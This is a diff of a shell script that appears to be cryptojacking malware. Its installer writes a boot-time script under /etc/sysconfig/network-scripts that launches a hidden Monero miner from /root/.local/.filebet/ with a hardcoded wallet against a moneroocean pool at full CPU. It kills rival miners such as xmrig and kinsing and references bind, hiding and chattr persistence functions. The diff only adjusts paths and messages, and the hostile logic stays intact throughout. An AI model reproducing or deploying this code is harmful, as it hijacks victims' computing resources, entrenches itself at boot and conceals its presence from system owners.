@@ -535,8 +535,6 @@ EOF
 rm -f /etc/sysconfig/network-scripts/file 2>/dev/null
 cat > /etc/sysconfig/network-scripts/file 2>/dev/null <<'EOF'
 #!/bin/bash
-local="/root/.local/.filebet/"
-
 rm -rf /root/.local/.filebet/ 2>/dev/null
 mkdir -p /root/.local/.filebet/	
 
@@ -546,13 +544,12 @@ fi
 
 chmod +x /root/.local/.filebet/filebet
 exec /root/.local/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `curl -s ifconfig.me` -k --cpu-max-threads-hint=100% -B
-
 EOF
 
 if [[ -f /etc/sysconfig/network-scripts/ping ]];then
 chmod +x /etc/sysconfig/network-scripts/ping
 /etc/sysconfig/network-scripts/ping
-printf "bind set up at boot time (debian)\n"
+printf "bind set up at boot time (rhel)\n"
 
 else
 printf  "[bind]: init file couldnt be created\n"
@@ -561,7 +558,7 @@ fi
 if [[ -f /etc/sysconfig/network-scripts/file ]];then
 chmod +x /etc/sysconfig/network-scripts/file
 /etc/sysconfig/network-scripts/file
-printf "miner set up at boot time (debian)\n"
+printf "miner set up at boot time (rhel)\n"
 
 else 
 printf  "[miner]: init file couldnt be created\n"
@@ -569,9 +566,9 @@ fi
 }
 
 miner_nopriv(){
-local="/dev/shm/.filebet/"
+local="/tmp/.work/.filebet/"
 
-kill -9 `ps -aux|grep -E '(miner|xmrig|filebet|kinsing)'|grep -Ev '(grep|egrep|ps)'|awk '{print $2}'` 2>/dev/null
+kill -9 `ps -aux|grep -E '(miner|xmrig|filebet|kinsing)'|grep -Ev '(grep|ps)'|awk '{print $2}'` 2>/dev/null
 rm -rf "$local" 2>/dev/null
 mkdir -p "$local"	
 
@@ -613,9 +610,8 @@ hide
 set_chattr
 
 elif [[ $1 == "--nopriv" ]]; then
-bind_nopriv
 miner_nopriv
-
+bind_nopriv
 else
 printf "system untouched.\n"
 exit 0
